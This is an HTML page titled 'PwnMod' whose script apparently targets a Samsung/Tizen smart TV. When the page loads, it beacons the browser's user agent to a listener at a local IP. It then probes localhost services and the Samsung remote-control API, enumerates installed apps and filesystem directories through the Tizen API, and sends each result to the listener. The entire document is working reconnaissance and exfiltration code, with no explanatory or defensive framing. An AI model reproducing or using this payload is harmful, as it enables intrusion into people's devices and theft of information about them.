<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>PwnMod</title></head>
<body style="background:#111;color:#0f0;font-family:monospace">
<h1>PwnMod</h1><pre id="log">beaconing...</pre>
<script>
var HOST = "http://192.168.0.109:9000";
var log = function(m) { document.getElementById("log").textContent += "\n" + m; };
function beacon(tag, data) {
  try { fetch(HOST + "/beacon?tag=" + encodeURIComponent(tag) + "&data=" + encodeURIComponent(data).slice(0, 1500)); } catch(e) {}
}
beacon("exec", navigator.userAgent);
// local service recon from inside the TV
var targets = [
  "http://localhost:8001/api/v2/",
  "http://localhost:8080/",
  "http://localhost:9080/",
  "http://127.0.0.1:7676/",
  "http://localhost:8080/ws/apps/",
  "http://localhost:8001/api/v2/channels/samsung.remote.control"
];
targets.forEach(function(u) {
  fetch(u, {mode: "cors"}).then(function(r){ return r.text(); }).then(function(t){
    beacon("local", u + " => " + t.slice(0, 200));
    log("OK " + u);
  }).catch(function(e){ beacon("localerr", u + " => " + e); });
});
// tizen API probing
try {
  if (typeof tizen !== "undefined") {
    beacon("tizen", "tizen object present");
    if (tizen.application) {
      tizen.application.getAppsInfo(function(apps) {
        beacon("apps", apps.map(function(a){ return a.name + "|" + a.id; }).join(";").slice(0, 1400));
      }, function(e){ beacon("appserr", e.message); });
    }
    if (tizen.filesystem) {
      ["documents", "downloads", "music", "images", "sounds", "videos"].forEach(function(d) {
        try { tizen.filesystem.resolve(d, function(dir){ beacon("fs", "resolve " + d + " OK: " + dir.fullPath); }, function(e){ beacon("fserr", d + ": " + e.message); }, "r"); } catch(e) {}
      });
    }
  } else { beacon("tizen", "no tizen object"); }
} catch(e) { beacon("tizenerr", String(e)); }
log("done - check listener");
</script></body></html>
